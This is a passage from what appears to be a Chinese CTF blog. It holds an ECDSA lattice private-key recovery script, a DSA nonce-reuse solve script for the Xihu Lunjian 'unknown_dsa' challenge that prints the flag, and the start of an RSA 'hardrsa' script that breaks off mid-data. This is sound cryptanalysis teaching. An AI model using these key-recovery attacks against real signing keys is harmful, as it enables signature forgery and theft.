class="number">73097690521715951799970838178781632193477113563863753640695474160716869379764</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">18</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">106161906844186418058181301258275701377478528456000776806125783785658631404181</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">31715141625988858395647563347388393436887940182588450761533407117309806174077</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">66</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">5303535821788657002325944705273136233819562542522195125121038371955343421419</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">78397084386133206842177430090192061714731488372250396733773851724398880497514</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">101</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">47334534798804086081486681543722162354894779113562050101787508819286859806850</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">68089994439417471012695854504683307776242576873504459358107900063950359216143</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">189</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">36727966094828492985010705464970784349886646761852256158003957807677345808368</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">56483072968516416277056131657803081037243661629860909110025658578993681976695</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">172</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">66767498501865501059586172224178680992433429230899397158151647077546376914330</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">71507726414099919847061480992524469185628538199482529188398302751269244413</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">74</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">42331219431518983942053287015263175710318540173683166191728827482546416852200</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">103296118807595402290453781121662381645145002957161794624581579143784860333642</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">226</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">73137683054475202604691445299629345128331602405316744478949553222293627816512</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">95736070574332409143271040569971516204641464665029894945162898075678965925911</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">55</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">59322396996150802441268548540408489103102729015912885455090402178935475075274</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">86211486643602088705124304208190601107227400071368214292735678674659753863895</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">118</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">109284751097372741715472236724359002803381919164425981347643418650665196594995</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">64437551949268598142008236285131984252451055568777495868220310434195796060532</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">179</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">63226440312145244111437322458843394627785519820305814308675566097273193036010</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">4122101870841210737716151622780017796991782299604264587729763829387507107239</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">178</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">70123467048635185148732787145251526019694962174096017923976017225760977001835</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">106936884916672867817194495447546864904684825055332200105035390411409292442424</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">54</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">43625160405666286105034419346441270171119537900263617268442743043478466770712</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">88016093997617463445687404088233295780396703084992919918915653935200820870114</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">19</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">37794511871358787559898091983989809149282480016758278442564934501204007782565</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">108726494577882306693566887621441222341481012316758653813801090222878990357007</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">236</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">55346397754686965001204122905095888588901405930263297844043851570235645651906</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">1326139938660601245698126283958513274174083970073078956723206560764495386187</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">18</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">80598458036879470043717563337403147522994695969612975863693729842183925731882</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">106400614138823315672488594305512071134854391773937526076561140551919873506697</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">12</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">73525611232302083737198085083457046646106727666521489812507560813073947228983</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">67648134858682718272030895010114496363861752247813558714250675660686067580827</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">77374004464593503347326078438915418046353454265353331423642866541001576581671</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">72807393556556726117697090335352026325853546007358146239096035418038196579915</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">251</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">55801417881848103985268367853827175553098225151244298592828756478211148987372</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">4696812647447589163557323334444292601541713255631239100801037072217573852717</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">132</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">66478305438885463157624751848170679451678290687034746979789959994179199169441</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">9246311535344979322617659403684845974497037445283478065823782826536199592112</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">81</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">57767533386102133266569263929854152970510701703020500741400686553770482662045</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">85209313576106356001715103784787349352733677752257813925634808583995892995426</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">68</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">22080432169355659942746405143419982106572487696614903943595709487899859033465</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">87124400406258970178433093706440351121426460377988695413004541644518826157224</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">19</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">81219830145632319474968310548001591071223486124426988584411621536993829625231</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">88853374648998735199455965124015057175802221774446875973641496412959256466574</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">120</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">41520575590885186096918771408514019644344901221031904184774272134324821644409</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">110489520276858536368901906035541819634025137491921279400613347723807146840270</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">213</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">30729812582938805525139786082933408782386995927051636583759667684162324365533</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">93629827169098241968890451208009360916537531256561631172792515686470663686994</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">105</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">1151148536401761079913222863678576801951780318174132914896436722677930599763</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">72869048062916226282898356328745058239119995524825570516346536949827908185913</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">200</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">31673762366362278041436072194318465084201504896641204205700010554561864351724</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">7971479792818355721755091942605141221820375902374107072872827528371245095540</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">103</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">94172167488409241833886283969895720213315807988076674432449581745202270411219</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">102599546646731647136698631769948894513209638932109597222981704513778082401646</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">20</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">80913714298459525759792646164197418695975002585545709516964899474703516088798</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">52636687791912054066928359636925655162166239912664563489231935367446353944310</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">203</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">58189431506357507469414047113700754987554496704882722421644981177549974910108</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">81185374791742970379378708683986692053503091200138313795555132162085398775031</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">11</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">72618477625259038063592993741778171988966935139957099286353751045809127010161</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">72459315233430064708454397191494297777816942336264199720879958591321824783937</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">46</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">18942795613437888076490527561091733321609539179266968622656696445931400366819</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">56617744641771622905529173218006328250138331061548120199503112395048253668493</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">214</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">30226544625731484087135954995489866952012787201852570605968607393546578906022</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">113452385063545747070843495924448430192277733544213912108779329438996361430276</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">5</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">20914099571520279196240842035585610365295688614553638376660238021020081274236</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">66521308758556183158097794927317895924318447285636001282995756174350820340744</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">235</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">65053167747034693117463012883347272626401144776494297499620155992382342472229</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">59822852780708784896478764978370543864303314314055224580164461809981460120957</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">18</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">109306712103726597023230557872272867971866838280982095070992578701450183821977</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">48423502128359288611990164830565884718636026525812155400168905719379254901679</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">40</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">92544350098313717393129847530859804233881635458575529574318912687871742684090</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">100650477269522761926550962269465062358174074689026021220619912706706978696439</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">63</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">67246871017779520213724656190571439980316065919398783469511920958233757720904</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">28043881127075439770049551267145060612019930240861915869810098075680535449051</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">245</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">76760605256444668018428351508640362126700062908699638534724783804098739437364</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">5150734774989448213481187144894210376004695450332747476783074396804882538634</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">115</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;]</span><br><span class="line">    q_target = [<span class="number">14691259845007157720953724270398401638548691391777695401107860616275888318430</span>, <span class="number">69216796642646390769515733371786970706593715870498880947415192904662437894112</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> ecdsa_lib.check_publickey(q_target, curve_string):</span><br><span class="line">        <span class="built_in">print</span>(</span><br><span class="line">            <span class="string">f&quot;Public key data invalid, not on the given <span class="subst">&#123;curve_string.upper()&#125;</span> curve.&quot;</span></span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Running with <span class="subst">&#123;known_bits&#125;</span> bits of k (<span class="subst">&#123;data_type&#125;</span>)&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Starting recovery attack (curve <span class="subst">&#123;curve_string.upper()&#125;</span>)&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> loop:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Will shuffle loop until the key found.&quot;</span>)</span><br><span class="line">    result = recover_private_key(</span><br><span class="line">        signatures, <span class="literal">None</span>, q_target, curve_string, data_type, known_bits, loop</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">if</span> result:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Key found \\o/&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Private key not found. Sorry For Your Loss&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    lattice_attack_cli(<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>

<p>干出这道直接冲到第九，结果竟然和出题师傅看的是同一个仓库</p>
<h2 id="p0o0w"><a href="#p0o0w" class="headerlink" title="p0o0w"></a>p0o0w</h2><p>什么玩意就Crypto全部去逆向算了</p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
      <tags>
        <tag>ECDSA</tag>
      </tags>
  </entry>
  <entry>
    <title>20211120 西湖论剑</title>
    <url>/posts/fbd2fb43/</url>
    <content><![CDATA[<p>题目很好鸭</p>
<p>这一周在学连分数和拓展维纳攻击，就考到了；但是头都看破WienerStudyTwice也没出，只会跑现成的jio本</p>
<p>此外这次比赛的nc很长时间不会断</p>
<span id="more"></span>

<h1 id="西湖论剑"><a href="#西湖论剑" class="headerlink" title="西湖论剑"></a>西湖论剑</h1><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="unknown-dsa"><a href="#unknown-dsa" class="headerlink" title="unknown_dsa"></a>unknown_dsa</h3><p>考连分数解佩尔方程和DSA，DSA的操作甚至攻击都可以看la佬博客</p>
<p><a href="https://lazzzaro.github.io/2020/05/13/crypto-%E5%85%B6%E4%BB%96%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/#DSA%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D">https://lazzzaro.github.io/2020/05/13/crypto-其他加密算法/#DSA数字签名</a></p>
<p>我们先来看DSA部分（当然前面还是先要求pqg，但是不知道是不是非预期，n=pq可以被分解，so whatever</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">t = powmod(g, p*q-(p+q), p*q)</span><br><span class="line"></span><br><span class="line">hm1 = bytes_to_long(SHA.new(m1).digest())</span><br><span class="line">hm2 = bytes_to_long(SHA.new(m2).digest())</span><br><span class="line"></span><br><span class="line">k = random.randint(<span class="number">1</span>, q-<span class="number">1</span>)</span><br><span class="line">r1 = powmod(g, k, p) % q</span><br><span class="line">s1 = (hm1 + x1*r1) * invert(k, q) % q</span><br><span class="line">s2 = (hm2 + x1*r1) * invert(k, q) % q</span><br><span class="line">r2 = powmod(g, x1, p) % q</span><br><span class="line">s3 = (hm1 + x2*r2) * invert(k, q) % q</span><br></pre></td></tr></table></figure>

<p>典型的复用$k$攻击，只需要知道$hm_1$和$hm_2$，就可以通过<br>$$<br>k(s_2-s_1)\equiv hm_2-hm_1\ (mod\ q)<br>$$<br>求$k$，进而$x_1$和$x_2$自然不在话下</p>
<p>再来看main函数部分</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ul)):</span><br><span class="line">    <span class="keyword">assert</span> ul[i]**<span class="number">2</span> - wl[i] * vl[i]**<span class="number">2</span> == <span class="number">1</span></span><br><span class="line">e = <span class="number">7</span></span><br><span class="line">cl1 = [<span class="built_in">int</span>(powmod(bytes_to_long(m1), e, x)) <span class="keyword">for</span> x <span class="keyword">in</span> ul]</span><br><span class="line">cl2 = [<span class="built_in">int</span>(powmod(bytes_to_long(m2), e, y)) <span class="keyword">for</span> y <span class="keyword">in</span> vl]</span><br><span class="line"><span class="built_in">print</span>(wl, cl1, cl2, sep=<span class="string">&#x27;, &#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>$$<br>x^2-ny^2=1<br>$$</p>
<p>典型的佩尔方程，二元二次不定方程存在无穷解，所有的解可以由$\sqrt{n}$的连分数求出（为什么？不知道，wiki上说的</p>
<p>直接穷搜就好了，看到之前春哥强网杯写的一个jo本，拿来改了一下</p>
<p>求出来$wl$和$vl$之后，用中国剩余定理扩大模数（因为e=7是在太小了，但又没有满足广播，so try一下</p>
<p>还有千万别导用gmpy2的sqrt，用sage自带的sqrt（不然你会笑着回来的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, bytes_to_long</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert, iroot</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve_pell</span>(<span class="params">_wl</span>):</span></span><br><span class="line">    cf = continued_fraction(sqrt(_wl))</span><br><span class="line">    conv = cf.convergents()</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> conv:</span><br><span class="line">        numer, denom = _.numerator(), _.denominator()</span><br><span class="line">        <span class="keyword">if</span> numer ^ <span class="number">2</span> - _wl * denom ^ <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> ZZ(numer), ZZ(denom)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># n = pq</span></span><br><span class="line">n, p_1_q, t = <span class="number">85198615386075607567070020969981777827671873654631200472078241980737834438897900146248840279191139156416537108399682874370629888207334506237040017838313558911275073904148451540255705818477581182866269413018263079858680221647341680762989080418039972704759003343616652475438155806858735982352930771244880990190318526933267455248913782297991685041187565140859</span>, <span class="number">106239950213206316301683907545763916336055243955706210944736472425965200103461421781804731678430116333702099777855279469137219165293725500887590280355973107580745212368937514070059991848948031718253804694621821734957604838125210951711527151265000736896607029198</span>, <span class="number">60132176395922896902518845244051065417143507550519860211077965501783315971109433544482411208238485135554065241864956361676878220342500208011089383751225437417049893725546176799417188875972677293680033005399883113531193705353404892141811493415079755456185858889801456386910892239869732805273879281094613329645326287205736614546311143635580051444446576104548</span></span><br><span class="line">r1, s1, s2 = <span class="number">498841194617327650445431051685964174399227739376</span>, <span class="number">376599166921876118994132185660203151983500670896</span>, <span class="number">187705159843973102963593151204361139335048329243</span></span><br><span class="line">r2, s3 = <span class="number">620827881415493136309071302986914844220776856282</span>, <span class="number">674735360250004315267988424435741132047607535029</span></span><br><span class="line"></span><br><span class="line">q = <span class="number">895513916279543445314258868563331268261201605181</span></span><br><span class="line">p = <span class="number">95139353880772104939870618145448234251031105153406565833029787299040378395002190438381537974853777890692924407167823818980082672873538133127131356810153012924025270883966172420658777903337576027105954119811495411149092960422055445121097259802686960288258399754185484307350305454788837702363971523085335074839</span></span><br><span class="line">g = invert(t, n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ul^2 - wl * vl^2 = 1</span></span><br><span class="line">wl = [<span class="number">3912956711</span>, <span class="number">4013184893</span>, <span class="number">3260747771</span>]</span><br><span class="line">cl1 = [</span><br><span class="line">    <span class="number">2852589223779928796266540600421678790889067284911682578924216186052590393595645322161563386615512475256726384365091711034449682791268994623758937752874750918200961888997082477100811025721898720783666868623498246219677221106227660895519058631965055790709130207760704</span>,</span><br><span class="line">    <span class="number">21115849906180139656310664607458425637670520081983248258984166026222898753505008904136688820075720411004158264138659762101873588583686473388951744733936769732617279649797085152057880233721961</span>,</span><br><span class="line">    <span class="number">301899179092185964785847705166950181255677272294377823045011205035318463496682788289651177635341894308537787449148199583490117059526971759804426977947952721266880757177055335088777693134693713345640206540670123872210178680306100865355059146219281124303460105424</span>]</span><br><span class="line">cl2 = [</span><br><span class="line">    <span class="number">148052450029409767056623510365366602228778431569288407577131980435074529632715014971133452626021226944632282479312378667353792117133452069972334169386837227285924011187035671874758901028719505163887789382835770664218045743465222788859258272826217869877607314144</span>,</span><br><span class="line">    <span class="number">1643631850318055151946938381389671039738824953272816402371095118047179758846703070931850238668262625444826564833452294807110544441537830199752050040697440948146092723713661125309994275256</span>,</span><br><span class="line">    <span class="number">10949587016016795940445976198460149258144635366996455598605244743540728764635947061037779912661207322820180541114179612916018317600403816027703391110922112311910900034442340387304006761589708943814396303183085858356961537279163175384848010568152485779372842</span>]</span><br><span class="line"></span><br><span class="line">n1 = []</span><br><span class="line">n2 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    n1.append(solve_pell(wl[i])[<span class="number">0</span>])</span><br><span class="line">    n2.append(solve_pell(wl[i])[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">c1 = crt(cl1, n1)</span><br><span class="line">c2 = crt(cl2, n2)</span><br><span class="line"><span class="keyword">assert</span> iroot(c1, <span class="number">7</span>)[<span class="number">1</span>]</span><br><span class="line">m1 = long_to_bytes(iroot(c1, <span class="number">7</span>)[<span class="number">0</span>])</span><br><span class="line">m2 = long_to_bytes(iroot(c2, <span class="number">7</span>)[<span class="number">0</span>])</span><br><span class="line">hm1 = bytes_to_long(SHA.new(m1).digest())</span><br><span class="line">hm2 = bytes_to_long(SHA.new(m2).digest())</span><br><span class="line"></span><br><span class="line"><span class="comment"># k * (s1 - s2) ≡ (H(m1) - H(m2)) mod q</span></span><br><span class="line">k = (hm1 - hm2) * invert(s1 - s2, q) % q</span><br><span class="line">x1 = (s1 * k - hm1) * invert(r1, q) % q</span><br><span class="line">x2 = (s3 * k - hm1) * invert(r2, q) % q</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(x1) + long_to_bytes(x2))</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DASCTF&#123;f11bad18f529750fe52c56eed85d001b&#125;</span><br></pre></td></tr></table></figure>

<h3 id="hardrsa"><a href="#hardrsa" class="headerlink" title="hardrsa"></a>hardrsa</h3><p>300分的hardrsa，然而却是原题（话说这次西湖论剑和2020羊城杯还是有几分相似，看最后一题Wiener就知道</p>
<p>这是2020羊城杯的Power（好家伙另外两道都复现偏偏这道没看</p>
<p>先贴exp（python跑太慢了，改成sage下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">dp = <span class="number">379476973158146550831004952747643994439940435656483772269013081580532539640189020020958796514224150837680366977747272291881285391919167077726836326564473</span></span><br><span class="line">c = <span class="number">57248258945927387673579467348106118747034381190703777861409527336272914559699490353325906672956273559867941402281438670652710909532261303394045079629146156340801932254839021574139943933451924062888426726353230757284582863993227592703323133265180414382062132580526658205716218046366247653881764658891315592607194355733209493239611216193118424602510964102026998674323685134796018596817393268106583737153516632969041693280725297929277751136040546830230533898514659714717213371619853137272515967067008805521051613107141555788516894223654851277785393355178114230929014037436770678131148140398384394716456450269539065009396311996040422853740049508500540281488171285233445744799680022307180452210793913614131646875949698079917313572873073033804639877699884489290120302696697425</span></span><br><span class="line">c1 = <span class="number">78100131461872285613426244322737502147219485108799130975202429638042859488136933783498210914335741940761656137516033926418975363734194661031678516857040723532055448695928820624094400481464950181126638456234669814982411270985650209245687765595483738876975572521276963149542659187680075917322308512163904423297381635532771690434016589132876171283596320435623376283425228536157726781524870348614983116408815088257609788517986810622505961538812889953185684256469540369809863103948326444090715161351198229163190130903661874631020304481842715086104243998808382859633753938512915886223513449238733721777977175430329717970940440862059204518224126792822912141479260791232312544748301412636222498841676742208390622353022668320809201312724936862167350709823581870722831329406359010293121019764160016316259432749291142448874259446854582307626758650151607770478334719317941727680935243820313144829826081955539778570565232935463201135110049861204432285060029237229518297291679114165265808862862827211193711159152992427133176177796045981572758903474465179346029811563765283254777813433339892058322013228964103304946743888213068397672540863260883314665492088793554775674610994639537263588276076992907735153702002001005383321442974097626786699895993544581572457476437853778794888945238622869401634353220344790419